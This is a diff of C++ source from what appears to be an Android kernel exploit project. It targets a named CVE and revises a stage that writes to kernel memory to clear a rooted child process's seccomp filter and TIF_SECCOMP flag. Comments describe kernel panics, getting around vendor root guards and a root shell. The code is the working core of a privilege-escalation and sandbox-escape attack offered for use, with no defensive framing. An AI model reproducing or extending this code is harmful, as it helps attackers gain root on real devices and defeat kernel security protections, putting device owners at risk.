@@ -237,8 +237,13 @@ namespace ghostlock::session::backend {
             return VictimRound::Rooted;
         }
 
-        /* Clear TIF_SECCOMP and seccomp.mode on the rooted child. Returns true when the
-         * child probe reports a filter-free fork. */
+        /* Attempt the seccomp clear with a masked TIF_SECCOMP write and
+         * mode=0/filter_count=1. The raw write is 8 bytes; a zero store
+         * clears every TIF_* flag and the filter reference count, which
+         * panics. The mask/value form avoids the panic, but the route's value
+         * write only applies 0/valid kernel pointers, so the child stays
+         * Seccomp: 2 on this kernel (verified). The final profile sets
+         * w3_attempts=0 and uses Shizuku. */
         template <class M>
         bool w3(ExploitSession &session, VictimChain &chain,
                 victim::w2_stage_context &w2_context,
@@ -247,13 +252,11 @@ namespace ghostlock::session::backend {
             int32_t &child_alive = chain.child_alive;
             int32_t &seccomp_ok = chain.seccomp_ok;
 
-            /* W3: clear the child's seccomp filter for the independent root shell
-         * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
-         * must be zeroed too; do both writes back-to-back with one probe
-         * (real finit_module calls trip vendor root guards).
-         * tcp stamps *(target) exactly, so aim straight at thread_info.flags
-         * (task+0) / seccomp.mode; only the pselect fallback needs the comm
-         * probe to tell [target] from [target+8]. */
+            /* W3: attempt the masked TIF_SECCOMP + mode/filter_count write.
+         * The route returns success but only applies 0/valid pointers, so the
+         * child stays Seccomp: 2 (verified). tcp stamps *(target) exactly; the
+         * pselect fallback needs the comm probe to tell [target] from
+         * [target+8]. The final profile skips this path (w3_attempts=0). */
             if (!attack::process_has_seccomp()) {
                 pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
                 seccomp_ok = 1;
@@ -292,11 +295,11 @@ namespace ghostlock::session::backend {
 
             uint32_t w3_attempts = g_exploit_session.profile.w3_attempts();
             for (uint32_t attempt = 1; attempt <= w3_attempts; attempt++) {
-                pr_info("W3: TIF_SECCOMP+mode attempt %u/%u\n", attempt, w3_attempts);
+                pr_info("W3: TIF_SECCOMP mask + mode attempt %u/%u\n", attempt, w3_attempts);
                 if (attempt == 1) attack::slab_drain();
                 support::run_state::enter("w3b");
                 const memory::WriteRequest flags_request =
-                        memory::WriteRequest::make(flags_target, memory::WriteMode::Zero, 1);
+                        memory::WriteRequest::make(flags_target, memory::WriteMode::SeccompFlags, 0);
                 Status routed = Cve2026_43499Policy::template attack_write<M>(session, flags_request, "W3: TIF_SECCOMP");
                 if (!routed) {
                     pr_warning("W3 attempt %u route failed; backing off\n", attempt);
@@ -307,7 +310,7 @@ namespace ghostlock::session::backend {
                 usleep(g_exploit_session.profile.w3_settle_us());
                 support::run_state::enter("w3c");
                 const memory::WriteRequest mode_request =
-                        memory::WriteRequest::make(mode_target, memory::WriteMode::Zero, 1);
+                        memory::WriteRequest::make(mode_target, memory::WriteMode::SeccompMode, 0);
                 routed = Cve2026_43499Policy::template attack_write<M>(session, mode_request, "W3: seccomp mode");
                 if (!routed) {
                     pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
